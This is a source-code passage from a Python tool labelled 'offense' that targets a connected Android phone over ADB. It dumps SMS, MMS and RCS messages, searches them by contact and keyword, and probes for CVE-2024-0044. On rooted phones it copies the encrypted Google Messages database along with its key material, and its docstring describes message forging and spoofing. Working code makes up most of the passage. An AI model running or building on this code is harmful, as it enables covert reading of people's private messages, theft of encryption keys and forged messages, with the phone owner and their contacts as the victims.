"""AUTARCH RCS/SMS Exploitation v2.0

Comprehensive RCS/SMS message extraction, forging, modification, and exploitation
on connected Android devices via ADB content provider commands, Shizuku shell
access, CVE-2024-0044 privilege escalation, AOSP RCS provider queries, and
Archon app integration.

All operations execute on the target phone — nothing runs locally except
command dispatch and output parsing.

IMPORTANT: The bugle_db (Google Messages RCS database) is encrypted at rest.
The database uses SQLCipher or Android's encrypted SQLite APIs.  To read it
after extraction, you must ALSO extract the encryption key.  Key locations:
  - shared_prefs/ XML files (key material or key alias)
  - Android Keystore (hardware-backed master key — requires app-UID or root)
  - /data/data/com.google.android.apps.messaging/files/ (session keys, config)
Samsung devices add an additional proprietary encryption layer.

Exploitation paths (in order of preference):
  1. Content providers (UID 2000 / shell — no root needed, SMS/MMS only)
  2. Archon app relay (READ_SMS + Shizuku → query via app context, bypasses encryption)
  3. CVE-2024-0044 (Android 12-13 pre-Oct 2024 — full app-UID access, can read decrypted DB)
  4. ADB backup (deprecated on Android 12+ but works on some devices)
  5. Root (if available — can extract DB + keys)
"""

DESCRIPTION = "RCS/SMS Exploitation — Database extraction, forging, backup & spoofing"
AUTHOR = "AUTARCH"
VERSION = "2.0"
CATEGORY = "offense"

import os
import re
import csv
import json
import time
import shlex
import struct
import sqlite3
import subprocess
import threading
import zlib
from io import StringIO
from pathlib import Path
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple
from xml.etree import ElementTree as ET

try:
    from core.paths import find_tool, get_data_dir
except ImportError:
    import shutil as _sh

    def find_tool(name):
        return _sh.which(name)

    def get_data_dir():
        return Path(__file__).resolve().parent.parent / 'data'


# ── Module-level singleton ──────────────────────────────────────────────────

_instance: Optional['RCSTools'] = None


def get_rcs_tools() -> 'RCSTools':
    global _instance
    if _instance is None:
        _instance = RCSTools()
    return _instance


# ── Constants ────────────────────────────────────────────────────────────────

# Standard Android telephony content providers (accessible at UID 2000)
SMS_URI = 'content://sms/'
SMS_INBOX_URI = 'content://sms/inbox'
SMS_SENT_URI = 'content://sms/sent'
SMS_DRAFT_URI = 'content://sms/draft'
SMS_OUTBOX_URI = 'content://sms/outbox'
MMS_URI = 'content://mms/'
MMS_INBOX_URI = 'content://mms/inbox'
MMS_SENT_URI = 'content://mms/sent'
MMS_PART_URI = 'content://mms/part'
MMS_SMS_CONVERSATIONS_URI = 'content://mms-sms/conversations'
MMS_SMS_DRAFT_URI = 'content://mms-sms/draft'
MMS_SMS_UNDELIVERED_URI = 'content://mms-sms/undelivered'
MMS_SMS_LOCKED_URI = 'content://mms-sms/locked'

# AOSP RCS content provider (authority: "rcs")
RCS_THREAD_URI = 'content://rcs/thread'
RCS_P2P_THREAD_URI = 'content://rcs/p2p_thread'
RCS_GROUP_THREAD_URI = 'content://rcs/group_thread'
RCS_PARTICIPANT_URI = 'content://rcs/participant'
RCS_MESSAGE_URI_FMT = 'content://rcs/p2p_thread/{thread_id}/message'
RCS_FILE_TRANSFER_URI_FMT = 'content://rcs/p2p_thread/{thread_id}/file_transfer'
RCS_INCOMING_MSG_URI_FMT = 'content://rcs/p2p_thread/{thread_id}/incoming_message'
RCS_OUTGOING_MSG_URI_FMT = 'content://rcs/p2p_thread/{thread_id}/outgoing_message'

# Google Messages proprietary providers (may require elevated access)
GMSGS_PROVIDER = 'content://com.google.android.apps.messaging.datamodel.MessagingContentProvider'

# All known RCS-related content provider URIs to enumerate
ALL_RCS_URIS = [
    'content://rcs/thread',
    'content://rcs/p2p_thread',
    'content://rcs/group_thread',
    'content://rcs/participant',
    'content://im/messages/',
    'content://com.google.android.apps.messaging/messages',
    'content://com.google.android.apps.messaging.datamodel.MessagingContentProvider',
    'content://com.google.android.ims.provider/',
    'content://com.google.android.gms.ims.provider/',
    'content://com.google.android.rcs.provider/',
    'content://com.samsung.android.messaging/',
    'content://com.samsung.rcs.autoconfigurationprovider/root/*',
]

# SMS type codes (android.provider.Telephony.Sms constants)
MSG_TYPE_ALL = 0
MSG_TYPE_INBOX = 1    # received
MSG_TYPE_SENT = 2     # sent
MSG_TYPE_DRAFT = 3
MSG_TYPE_OUTBOX = 4
MSG_TYPE_FAILED = 5
MSG_TYPE_QUEUED = 6

# MMS message box codes
MMS_BOX_INBOX = 1
MMS_BOX_SENT = 2
MMS_BOX_DRAFT = 3
MMS_BOX_OUTBOX = 4

# bugle_db message_protocol values
PROTOCOL_SMS = 0
PROTOCOL_MMS = 1
PROTOCOL_RCS = 2  # Google proprietary — values >= 2 indicate RCS

# bugle_db paths on device
BUGLE_DB_PATHS = [
    '/data/data/com.google.android.apps.messaging/databases/bugle_db',
    '/data/user/0/com.google.android.apps.messaging/databases/bugle_db',
    '/data/data/com.android.messaging/databases/bugle_db',
]

# Telephony provider database
MMSSMS_DB_PATHS = [
    '/data/data/com.android.providers.telephony/databases/mmssms.db',
    '/data/user_de/0/com.android.providers.telephony/databases/mmssms.db',
]

# Samsung messaging databases
SAMSUNG_DB_PATHS = [
    '/data/data/com.samsung.android.messaging/databases/',
    '/data/data/com.sec.android.provider.logsprovider/databases/logs.db',
]

# Known messaging packages
MESSAGING_PACKAGES = [
    'com.google.android.apps.messaging',  # Google Messages
    'com.android.messaging',              # AOSP Messages
    'com.samsung.android.messaging',      # Samsung Messages
    'com.verizon.messaging.vzmsgs',        # Verizon Message+
]

# Column projections
SMS_COLUMNS = '_id:thread_id:address:body:date:date_sent:type:read:status:protocol:service_center:person:subject:locked:seen'
MMS_COLUMNS = '_id:thread_id:date:msg_box:sub:sub_cs:ct_l:exp:m_type:read:seen:st'
MMS_PART_COLUMNS = '_id:mid:ct:text:_data:name'

# Known CVEs affecting RCS/Android messaging
RCS_CVES = {
    'CVE-2023-24033': {
        'severity': 'critical', 'cvss': 9.8,
        'desc': 'Samsung Exynos baseband RCE via RCS SDP accept-type parsing',
        'affected': 'Exynos 5123, 5300, 980, 1080, Auto T5123',
        'type': 'zero-click', 'discoverer': 'Google Project Zero',
        'mitigation': 'Disable Wi-Fi calling and VoLTE; apply March 2023 patches',
    },
    'CVE-2024-0044': {
        'severity': 'high', 'cvss': 7.8,
        'desc': 'Android run-as privilege escalation via newline injection in PackageInstallerService',
        'affected': 'Android 12-13 pre-October 2024 security patch',
        'type': 'local', 'discoverer': 'Meta Red Team X',
        'mitigation': 'Apply October 2024 security patch',
        'exploit_available': True,
    },
    'CVE-2024-31317': {
        'severity': 'high', 'cvss': 7.8,
        'desc': 'Android system_server run-as bypass via command injection',
        'affected': 'Android 12-14 pre-QPR2',
        'type': 'local', 'discoverer': 'Meta Red Team X',
        'mitigation': 'Apply June 2024 security patch',
    },
    'CVE-2024-49415': {
        'severity': 'high', 'cvss': 8.1,
        'desc': 'Samsung libsaped.so zero-click RCE via RCS audio message (OOB write in APE decoder)',
        'affected': 'Samsung Galaxy S23/S24 Android 12-14 pre-December 2024',
        'type': 'zero-click', 'discoverer': 'Natalie Silvanovich (Project Zero)',
        'mitigation': 'Apply December 2024 Samsung security patch',
    },
    'CVE-2025-48593': {
        'severity': 'critical', 'cvss': 9.8,
        'desc': 'Android System component zero-click RCE',
        'affected': 'Android 13, 14, 15, 16',
        'type': 'zero-click', 'discoverer': 'Android Security Team',
        'mitigation': 'Apply November 2025 security patch',
    },
    'CVE-2017-0780': {
        'severity': 'medium', 'cvss': 5.5,
        'desc': 'Android Messages crash via crafted message (DoS)',
        'affected': 'Android 4.4-8.0',
        'type': 'remote', 'discoverer': 'Trend Micro',
        'mitigation': 'Update to patched Android version',
    },
}

# Phenotype flags for Google Messages debug/verbose logging
PHENOTYPE_FLAGS = {
    'verbose_bug_reports': 'bugle_phenotype__enable_verbose_bug_reports',
    'rcs_diagnostics': 'bugle_phenotype__enable_rcs_diagnostics',
    'debug_mode': 'bugle_phenotype__enable_debug_mode',
}

# Enterprise archival broadcast
ARCHIVAL_BROADCAST_ACTION = 'GOOGLE_MESSAGES_ARCHIVAL_UPDATE'
ARCHIVAL_URI_EXTRA = 'com.google.android.apps.messaging.EXTRA_ARCHIVAL_URI'


# ── RCSTools Class ───────────────────────────────────────────────────────────

class RCSTools:
    """Comprehensive RCS/SMS exploitation via ADB."""

    def __init__(self):
        self._adb_path: Optional[str] = None
        self._data_dir: Path = Path(get_data_dir()) / 'rcs_tools'
        self._data_dir.mkdir(parents=True, exist_ok=True)
        self._backups_dir: Path = self._data_dir / 'backups'
        self._backups_dir.mkdir(parents=True, exist_ok=True)
        self._exports_dir: Path = self._data_dir / 'exports'
        self._exports_dir.mkdir(parents=True, exist_ok=True)
        self._extracted_dir: Path = self._data_dir / 'extracted_dbs'
        self._extracted_dir.mkdir(parents=True, exist_ok=True)
        self._monitor_thread: Optional[threading.Thread] = None
        self._monitor_running = False
        self._intercepted: List[Dict[str, Any]] = []
        self._intercepted_lock = threading.Lock()
        self._forged_log: List[Dict[str, Any]] = []
        self._cve_exploit_active = False
        self._exploit_victim_name: Optional[str] = None

    # ══════════════════════════════════════════════════════════════════════
    # §1  ADB HELPERS
    # ══════════════════════════════════════════════════════════════════════

    def _get_adb(self) -> str:
        if self._adb_path is None:
            self._adb_path = find_tool('adb')
        if not self._adb_path:
            raise RuntimeError('adb not found')
        return self._adb_path

    def _run_adb(self, command: str, timeout: int = 30) -> str:
        adb = self._get_adb()
        full_cmd = f'{adb} {command}'
        try:
            result = subprocess.run(
                full_cmd, shell=True, capture_output=True, text=True, timeout=timeout,
            )
            if result.returncode != 0 and result.stderr.strip():
                return f'[adb error] {result.stderr.strip()}'
            return result.stdout.strip()
        except subprocess.TimeoutExpired:
            return f'[adb error] Command timed out after {timeout}s'
        except Exception as e:
            return f'[adb error] {e}'

    def _run_adb_binary(self, command: str, timeout: int = 60) -> Optional[bytes]:
        adb = self._get_adb()
        full_cmd = f'{adb} {command}'
        try:
            result = subprocess.run(
                full_cmd, shell=True, capture_output=True, timeout=timeout,
            )
            if result.returncode != 0:
                return None
            return result.stdout
        except Exception:
            return None

    def _run_shizuku(self, command: str, timeout: int = 30) -> str:
        escaped = command.replace("'", "'\\''")
        return self._run_adb(f"shell sh -c '{escaped}'", timeout=timeout)

    def _shell(self, command: str, timeout: int = 30) -> str:
        return self._run_adb(f'shell {command}', timeout=timeout)

    def _content_query(self, uri: str, projection: str = '', where: str = '',
                       sort: str = '', limit: int = 0) -> List[Dict[str, str]]:
        cmd = f'shell content query --uri {uri}'
        if projection:
            cmd += f' --projection {projection}'
        if where:
            cmd += f' --where "{where}"'
        if sort:
            cmd += f' --sort "{sort}"'
        output = self._run_adb(cmd, timeout=30)
        rows = self._parse_content_query(output)
        if limit > 0:
            rows = rows[:limit]
        return rows

    def _content_insert(self, uri: str, bindings: Dict[str, Any]) -> str:
        cmd = f'shell content insert --uri {uri}'
        for key, val in bindings.items():
            if val is None:
                cmd += f' --bind {key}:s:NULL'
            elif isinstance(val, int):
                cmd += f' --bind {key}:i:{val}'
            elif isinstance(val, float):
                cmd += f' --bind {key}:f:{val}'
            else:
                safe = str(val).replace("'", "'\\''")
                cmd += f" --bind {key}:s:'{safe}'"
        return self._run_adb(cmd)

    def _content_update(self, uri: str, bindings: Dict[str, Any], where: str = '') -> str:
        cmd = f'shell content update --uri {uri}'
        for key, val in bindings.items():
            if val is None:
                cmd += f' --bind {key}:s:NULL'
            elif isinstance(val, int):
                cmd += f' --bind {key}:i:{val}'
            else:
                safe = str(val).replace("'", "'\\''")
                cmd += f" --bind {key}:s:'{safe}'"
        if where:
            cmd += f' --where "{where}"'
        return self._run_adb(cmd)

    def _content_delete(self, uri: str, where: str = '') -> str:
        cmd = f'shell content delete --uri {uri}'
        if where:
            cmd += f' --where "{where}"'
        return self._run_adb(cmd)

    def _parse_content_query(self, output: str) -> List[Dict[str, str]]:
        rows = []
        if not output or output.startswith('[adb error]'):
            return rows
        for line in output.splitlines():
            line = line.strip()
            if not line.startswith('Row:'):
                continue
            match = re.match(r'Row:\s*\d+\s+(.*)', line)
            if not match:
                continue
            payload = match.group(1)
            row = {}
            parts = re.split(r',\s+(?=[a-zA-Z_]+=)', payload)
            for part in parts:
                eq_pos = part.find('=')
                if eq_pos == -1:
                    continue
                key = part[:eq_pos].strip()
                val = part[eq_pos + 1:].strip()
                if val == 'NULL':
                    val = None
                row[key] = val
            if row:
                rows.append(row)
        return rows

    def _is_error(self, output: str) -> bool:
        return output.startswith('[adb error]') if output else True

    def _ts_ms(self, dt: Optional[datetime] = None) -> int:
        if dt is None:
            dt = datetime.now(timezone.utc)
        return int(dt.timestamp() * 1000)

    def _format_ts(self, ts_ms) -> str:
        try:
            ts = int(ts_ms) / 1000
            return datetime.fromtimestamp(ts, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        except (ValueError, TypeError, OSError):
            return str(ts_ms)

    # ══════════════════════════════════════════════════════════════════════
    # §2  DEVICE CONNECTION & STATUS
    # ══════════════════════════════════════════════════════════════════════

    def get_connected_device(self) -> Dict[str, Any]:
        output = self._run_adb('devices')
        devices = []
        for line in output.splitlines():
            line = line.strip()
            if line and not line.startswith('List') and not line.startswith('*'):
                parts = line.split('\t')
                if len(parts) >= 2:
                    devices.append({'serial': parts[0], 'state': parts[1]})
        if not devices:
            return {'connected': False, 'error': 'No devices connected'}
        for d in devices:
            if d['state'] == 'device':
                return {'connected': True, 'serial': d['serial'], 'state': 'device'}
        return {'connected': False, 'error': f'Device state: {devices[0]["state"]}'}

    def get_device_info(self) -> Dict[str, Any]:
        dev = self.get_connected_device()
        if not dev.get('connected'):
            return dev
        info = {
            'connected': True,
            'serial': dev['serial'],
            'model': self._shell('getprop ro.product.model'),
            'manufacturer': self._shell('getprop ro.product.manufacturer'),
            'android_version': self._shell('getprop ro.build.version.release'),
            'sdk_version': self._shell('getprop ro.build.version.sdk'),
            'security_patch': self._shell('getprop ro.build.version.security_patch'),
            'build_id': self._shell('getprop ro.build.display.id'),
            'brand': self._shell('getprop ro.product.brand'),
            'device': self._shell('getprop ro.product.device'),
            'is_pixel': 'pixel' in self._shell('getprop ro.product.brand').lower()
                        or 'google' in self._shell('getprop ro.product.manufacturer').lower(),
            'is_samsung': 'samsung' in self._shell('getprop ro.product.manufacturer').lower(),
        }
        # Check default SMS app
        sms_app = self._shell('settings get secure sms_default_application')
        info['default_sms_app'] = sms_app if not self._is_error(sms_app) else 'unknown'
        return info

    def get_status(self) -> Dict[str, Any]:
        dev = self.get_device_info()
        if not dev.get('connected'):
            return {'ok': False, 'connected': False, 'error': dev.get('error', 'Not connected')}
        # Check Shizuku
        shizuku = self.check_shizuku_status()
        # Check Archon
        archon = self.check_archon_installed()
        # Check CVE vulnerability
        cve_status = self.check_cve_2024_0044()
        return {
            'ok': True,
            'connected': True,
            'device': dev,
            'shizuku': shizuku,
            'archon': archon,
            'cve_2024_0044': cve_status,
            'exploit_active': self._cve_exploit_active,
            'monitor_running': self._monitor_running,
            'intercepted_count': len(self._intercepted),
            'forged_count': len(self._forged_log),
        }

    def check_shizuku_status(self) -> Dict[str, Any]:
        # Check if Shizuku is installed
        pm_output = self._shell('pm list packages moe.shizuku.privileged.api')
        installed = 'moe.shizuku.privileged.api' in pm_output if not self._is_error(pm_output) else False
        if not installed:
            pm_output = self._shell('pm list packages rikka.shizuku')
            installed = 'rikka.shizuku' in pm_output if not self._is_error(pm_output) else False
        # Check if Shizuku service is running
        running = False
        if installed:
            ps_out = self._shell('ps -A | grep shizuku')
            running = bool(ps_out and not self._is_error(ps_out) and 'shizuku' in ps_out.lower())
        return {'installed': installed, 'running': running, 'uid': 2000 if running else None}

    def check_archon_installed(self) -> Dict[str, Any]:
        pm_output = self._shell('pm list packages com.darkhal.archon')
        installed = 'com.darkhal.archon' in pm_output if not self._is_error(pm_output) else False
        result = {'installed': installed}
        if installed:
            # Check version
            dump = self._shell('dumpsys package com.darkhal.archon | grep versionName')
            if dump and not self._is_error(dump):
                m = re.search(r'versionName=(\S+)', dump)
                if m:
                    result['version'] = m.group(1)
            # Check if Archon has messaging/RCS permissions
            perms = self._shell('dumpsys package com.darkhal.archon | grep "android.permission.READ_SMS"')
            result['has_sms_permission'] = 'granted=true' in perms if perms else False
            perms2 = self._shell('dumpsys package com.darkhal.archon | grep "android.permission.READ_CONTACTS"')
            result['has_contacts_permission'] = 'granted=true' in perms2 if perms2 else False
        return result

    def get_security_patch_level(self) -> Dict[str, Any]:
        patch = self._shell('getprop ro.build.version.security_patch')
        android_ver = self._shell('getprop ro.build.version.release')
        sdk = self._shell('getprop ro.build.version.sdk')
        result = {
            'security_patch': patch,
            'android_version': android_ver,
            'sdk_version': sdk,
        }
        # Check if CVE-2024-0044 is exploitable
        try:
            sdk_int = int(sdk)
            if sdk_int in (31, 32, 33):  # Android 12, 12L, 13
                if patch and patch < '2024-10-01':
                    result['cve_2024_0044_vulnerable'] = True
                else:
                    result['cve_2024_0044_vulnerable'] = False
            else:
                result['cve_2024_0044_vulnerable'] = False
        except (ValueError, TypeError):
            result['cve_2024_0044_vulnerable'] = False
        return result

    def get_default_sms_app(self) -> Dict[str, Any]:
        app = self._shell('settings get secure sms_default_application')
        if self._is_error(app):
            return {'ok': False, 'error': app}
        return {'ok': True, 'package': app}

    def set_default_sms_app(self, package: str) -> Dict[str, Any]:
        # Verify package exists
        pm = self._shell(f'pm list packages {shlex.quote(package)}')
        if package not in pm:
            return {'ok': False, 'error': f'Package {package} not found'}
        result = self._shell(f'settings put secure sms_default_application {shlex.quote(package)}')
        if self._is_error(result) and result:
            return {'ok': False, 'error': result}
        return {'ok': True, 'message': f'Default SMS app set to {package}'}

    # ══════════════════════════════════════════════════════════════════════
    # §3  IMS/RCS DIAGNOSTICS
    # ══════════════════════════════════════════════════════════════════════

    def get_ims_status(self) -> Dict[str, Any]:
        output = self._shell('dumpsys telephony_ims')
        if self._is_error(output):
            # Try alternate service name
            output = self._shell('dumpsys telephony.registry')
        if self._is_error(output):
            return {'ok': False, 'error': 'Cannot query IMS status'}
        lines = output.splitlines()
        result = {'ok': True, 'raw': output[:5000]}
        for line in lines:
            line_l = line.strip().lower()
            if 'registered' in line_l and 'ims' in line_l:
                result['ims_registered'] = 'true' in line_l or 'yes' in line_l
            if 'rcs' in line_l and ('enabled' in line_l or 'connected' in line_l):
                result['rcs_enabled'] = True
            if 'volte' in line_l and 'enabled' in line_l:
                result['volte_enabled'] = True
        return result

    def get_carrier_config(self) -> Dict[str, Any]:
        output = self._shell('dumpsys carrier_config')
        if self._is_error(output):
            return {'ok': False, 'error': output}
        rcs_keys = {}
        for line in output.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['rcs', 'ims', 'uce', 'presence', 'single_registration']):
                if '=' in line:
                    key, _, val = line.partition('=')
                    rcs_keys[key.strip()] = val.strip()
        return {'ok': True, 'rcs_config': rcs_keys, 'raw_length': len(output)}

    def get_rcs_registration_state(self) -> Dict[str, Any]:
        # Check Google Messages RCS state via dumpsys
        output = self._shell('dumpsys activity service com.google.android.apps.messaging')
        rcs_state = 'unknown'
        if output and not self._is_error(output):
            for line in output.splitlines():
                if 'rcs' in line.lower() and ('state' in line.lower() or 'connected' in line.lower()):
                    rcs_state = line.strip()
                    break
        # Also try carrier_services
        cs_output = self._shell('dumpsys activity service com.google.android.ims')
        cs_state = 'unknown'
        if cs_output and not self._is_error(cs_output):
            for line in cs_output.splitlines():
                if 'provisioned' in line.lower() or 'registered' in line.lower():
                    cs_state = line.strip()
                    break
        return {
            'ok': True,
            'messages_rcs_state': rcs_state,
            'carrier_services_state': cs_state,
        }

    def enable_verbose_logging(self) -> Dict[str, Any]:
        results = {}
        # Set Phenotype flag for verbose bug reports (no root needed)
        for name, flag in PHENOTYPE_FLAGS.items():
            cmd = (
                f'shell am broadcast '
                f"-a 'com.google.android.gms.phenotype.FLAG_OVERRIDE' "
                f'--es package "com.google.android.apps.messaging#com.google.android.apps.messaging" '
                f'--es user "\\*" '
                f'--esa flags "{flag}" '
                f'--esa values "true" '
                f'--esa types "boolean" '
                f'com.google.android.gms'
            )
            out = self._run_adb(cmd)
            results[name] = 'success' if 'Broadcast completed' in out else out
        # Try setting log tags (may require root)
        log_tags = ['Bugle', 'BugleDataModel', 'BugleRcs', 'BugleRcsEngine',
                     'RcsProvisioning', 'CarrierServices', 'BugleTransport']
        for tag in log_tags:
            self._shell(f'setprop log.tag.{tag} VERBOSE')
        results['log_tags'] = 'attempted (may require root)'
        return {'ok': True, 'results': results}

    def capture_rcs_logs(self, duration: int = 10) -> Dict[str, Any]:
        # Clear logcat first
        self._shell('logcat -c')
        # Capture filtered logs
        tags = 'Bugle:V BugleRcs:V RcsProvisioning:V CarrierServices:V BugleRcsEngine:V *:S'
        output = self._run_adb(f'shell logcat -d -s {tags}', timeout=duration + 5)
        if self._is_error(output):
            return {'ok': False, 'error': output}
        lines = output.splitlines()
        return {'ok': True, 'lines': lines[:500], 'total_lines': len(lines)}

    # ══════════════════════════════════════════════════════════════════════
    # §4  CONTENT PROVIDER EXTRACTION (no root needed)
    # ══════════════════════════════════════════════════════════════════════

    def read_sms_database(self, limit: int = 200) -> List[Dict[str, Any]]:
        rows = self._content_query(SMS_URI, projection=SMS_COLUMNS, limit=limit)
        for row in rows:
            if row.get('date'):
                row['date_formatted'] = self._format_ts(row['date'])
            row['protocol_name'] = 'SMS'
            msg_type = int(row.get('type', 0))
            row['direction'] = 'incoming' if msg_type == MSG_TYPE_INBOX else 'outgoing'
        return rows

    def read_sms_inbox(self, limit: int = 100) -> List[Dict[str, Any]]:
        return self._content_query(SMS_INBOX_URI, projection=SMS_COLUMNS, limit=limit)

    def read_sms_sent(self, limit: int = 100) -> List[Dict[str, Any]]:
        return self._content_query(SMS_SENT_URI, projection=SMS_COLUMNS, limit=limit)

    def read_mms_database(self, limit: int = 100) -> List[Dict[str, Any]]:
        rows = self._content_query(MMS_URI, projection=MMS_COLUMNS, limit=limit)
        # Enrich with parts (body text)
        for row in rows:
            mms_id = row.get('_id')
            if mms_id:
                parts = self._content_query(
                    f'content://mms/{mms_id}/part',
                    projection=MMS_PART_COLUMNS,
                )
                row['parts'] = parts
                # Extract text body from parts
                for p in parts:
                    if p.get('ct') == 'text/plain' and p.get('text'):
                        row['body'] = p['text']
                        break
            if row.get('date'):
                row['date_formatted'] = self._format_ts(int(row['date']) * 1000)
        return rows

    def read_conversations(self, limit: int = 100) -> List[Dict[str, Any]]:
        rows = self._content_query(MMS_SMS_CONVERSATIONS_URI, limit=limit)
        return rows

    def read_draft_messages(self) -> List[Dict[str, Any]]:
        return self._content_query(MMS_SMS_DRAFT_URI)

    def read_undelivered_messages(self) -> List[Dict[str, Any]]:
        return self._content_query(MMS_SMS_UNDELIVERED_URI)

    def read_locked_messages(self) -> List[Dict[str, Any]]:
        return self._content_query(MMS_SMS_LOCKED_URI)

    def read_rcs_provider(self) -> Dict[str, Any]:
        """Query the AOSP RCS content provider (content://rcs/)."""
        results = {}
        # Threads
        threads = self._content_query(RCS_THREAD_URI)
        results['threads'] = threads
        results['thread_count'] = len(threads)
        # P2P threads
        p2p = self._content_query(RCS_P2P_THREAD_URI)
        results['p2p_threads'] = p2p
        # Group threads
        groups = self._content_query(RCS_GROUP_THREAD_URI)
        results['group_threads'] = groups
        # Participants
        participants = self._content_query(RCS_PARTICIPANT_URI)
        results['participants'] = participants
        results['ok'] = True
        return results

    def read_rcs_messages(self, thread_id: Optional[int] = None) -> List[Dict[str, Any]]:
        """Read RCS messages from AOSP RCS provider."""
        if thread_id:
            uri = RCS_MESSAGE_URI_FMT.format(thread_id=thread_id)
        else:
            # Try querying all threads and getting messages from each
            threads = self._content_query(RCS_THREAD_URI)
            all_msgs = []
            for t in threads:
                tid = t.get('rcs_thread_id')
                if tid:
                    msgs = self._content_query(
                        RCS_MESSAGE_URI_FMT.format(thread_id=tid)
                    )
                    for m in msgs:
                        m['thread_id'] = tid
                    all_msgs.extend(msgs)
            return all_msgs
        return self._content_query(uri)

    def read_rcs_participants(self) -> List[Dict[str, Any]]:
        return self._content_query(RCS_PARTICIPANT_URI)

    def read_rcs_file_transfers(self, thread_id: int) -> List[Dict[str, Any]]:
        uri = RCS_FILE_TRANSFER_URI_FMT.format(thread_id=thread_id)
        return self._content_query(uri)

    def get_thread_messages(self, thread_id: int, limit: int = 200) -> List[Dict[str, Any]]:
        rows = self._content_query(
            SMS_URI, projection=SMS_COLUMNS,
            where=f'thread_id={thread_id}',
            limit=limit,
        )
        for row in rows:
            if row.get('date'):
                row['date_formatted'] = self._format_ts(row['date'])
        return rows

    def get_messages_by_address(self, address: str, limit: int = 200) -> List[Dict[str, Any]]:
        safe_addr = address.replace("'", "''")
        rows = self._content_query(
            SMS_URI, projection=SMS_COLUMNS,
            where=f"address='{safe_addr}'",
            limit=limit,
        )
        for row in rows:
            if row.get('date'):
                row['date_formatted'] = self._format_ts(row['date'])
        return rows

    def search_messages(self, keyword: str, limit: int = 100) -> List[Dict[str, Any]]:
        safe_kw = keyword.replace("'", "''").replace('%', '\\%')
        rows = self._content_query(
            SMS_URI, projection=SMS_COLUMNS,
            where=f"body LIKE '%{safe_kw}%'",
            limit=limit,
        )
        for row in rows:
            if row.get('date'):
                row['date_formatted'] = self._format_ts(row['date'])
        return rows

    def enumerate_providers(self) -> Dict[str, Any]:
        """Scan all known messaging content providers and report which are accessible."""
        accessible = []
        blocked = []
        for uri in ALL_RCS_URIS:
            out = self._run_adb(f'shell content query --uri {uri}', timeout=5)
            if self._is_error(out) or 'Permission Denial' in out or 'SecurityException' in out:
                blocked.append({'uri': uri, 'error': out[:200] if out else 'no response'})
            elif 'No result found' in out:
                accessible.append({'uri': uri, 'status': 'accessible', 'rows': 0})
            else:
                row_count = out.count('Row:')
                accessible.append({'uri': uri, 'status': 'has_data', 'rows': row_count})
        # Also check standard SMS/MMS
        for uri_name, uri in [('SMS', SMS_URI), ('MMS', MMS_URI), ('Conversations', MMS_SMS_CONVERSATIONS_URI)]:
            out = self._run_adb(f'shell content query --uri {uri}', timeout=5)
            if not self._is_error(out) and 'Permission' not in out:
                row_count = out.count('Row:')
                accessible.append({'uri': uri, 'status': 'has_data', 'rows': row_count, 'name': uri_name})
        return {
            'ok': True,
            'accessible': accessible,
            'blocked': blocked,
            'total_accessible': len(accessible),
            'total_blocked': len(blocked),
        }

    # ══════════════════════════════════════════════════════════════════════
    # §5  BUGLE_DB DIRECT EXTRACTION
    # ══════════════════════════════════════════════════════════════════════

    def extract_bugle_db(self) -> Dict[str, Any]:
        """Extract Google Messages bugle_db using best available method.

        IMPORTANT: bugle_db is ENCRYPTED at rest (SQLCipher / Android encrypted
        SQLite).  Extracting the raw .db file alone is not enough — you also need
        the encryption key.  Key is stored in shared_prefs or Android Keystore.

        Best approach: Use Archon relay to query the DB from within the app
        context (already decrypted in memory) or use CVE-2024-0044 to run as
        the messaging app UID (which can open the DB with the app's key).

        We also extract shared_prefs/ and files/ directories to capture key
        material alongside the database.  The WAL file (bugle_db-wal) may
        contain recent messages not yet checkpointed.
        """
        dev = self.get_connected_device()
        if not dev.get('connected'):
            return {'ok': False, 'error': 'No device connected'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        extract_dir = self._extracted_dir / timestamp
        extract_dir.mkdir(parents=True, exist_ok=True)

        # Method 1: Try Archon app relay (if installed and has permissions)
        # Best method — Archon queries from within app context where DB is decrypted
        archon = self.check_archon_installed()
        if archon.get('installed') and archon.get('has_sms_permission'):
            result = self._extract_via_archon(extract_dir)
            if result.get('ok'):
                return result

        # Method 2: Try CVE-2024-0044 (if vulnerable)
        # Runs as messaging app UID — can open encrypted DB with app's key
        cve = self.check_cve_2024_0044()
        if cve.get('vulnerable'):
            result = self._extract_via_cve(extract_dir)
            if result.get('ok'):
                return result

        # Method 3: Try root direct pull (DB + keys)
        root_check = self._shell('id')
        if 'uid=0' in root_check:
            result = self._extract_via_root(extract_dir)
            if result.get('ok'):
                return result

        # Method 4: Try adb backup
        result = self._extract_via_adb_backup(extract_dir)
        if result.get('ok'):
            return result

        # Method 5: Content provider fallback (SMS/MMS only, not full bugle_db)
        return {
            'ok': False,
            'error': 'Cannot extract bugle_db directly. The database is encrypted '
                     'at rest — raw file extraction requires the encryption key. '
                     'Best methods: '
                     '(1) Archon relay (queries from decrypted app context), '
                     '(2) CVE-2024-0044 (runs as app UID, can open encrypted DB), '
                     '(3) Root (extract DB + key material from shared_prefs/Keystore), '
                     '(4) Content providers for SMS/MMS only (already decrypted).',
            'fallback': 'content_providers',
        }

    def _extract_via_root(self, extract_dir: Path) -> Dict[str, Any]:
        """Extract bugle_db + encryption key material via root access.

        The database is encrypted at rest.  We pull:
          - bugle_db, bugle_db-wal, bugle_db-shm (encrypted database + WAL)
          - shared_prefs/ (may contain key alias or key material)
          - files/ directory (Signal Protocol state, config)
        """
        for db_path in BUGLE_DB_PATHS:
            check = self._shell(f'su -c "ls {db_path}" 2>/dev/null')
            if not self._is_error(check) and 'No such file' not in check:
                app_dir = str(Path(db_path).parent.parent)  # /data/data/com.google.android.apps.messaging
                staging = '/data/local/tmp/autarch_extract'
                self._shell(f'su -c "mkdir -p {staging}/shared_prefs {staging}/files"')
                # Copy database files
                for suffix in ['', '-wal', '-shm', '-journal']:
                    src = f'{db_path}{suffix}'
                    self._shell(f'su -c "cp {src} {staging}/ 2>/dev/null"')
                    self._shell(f'su -c "chmod 644 {staging}/{os.path.basename(src)}"')
                # Copy shared_prefs (encryption key material)
                self._shell(f'su -c "cp -r {app_dir}/shared_prefs/* {staging}/shared_prefs/ 2>/dev/null"')
                self._shell(f'su -c "chmod -R 644 {staging}/shared_prefs/"')
                # Copy files dir (Signal Protocol keys, config)
                self._shell(f'su -c "cp -r {app_dir}/files/* {staging}/files/ 2>/dev/null"')
                self._shell(f'su -c "chmod -R 644 {staging}/files/"')
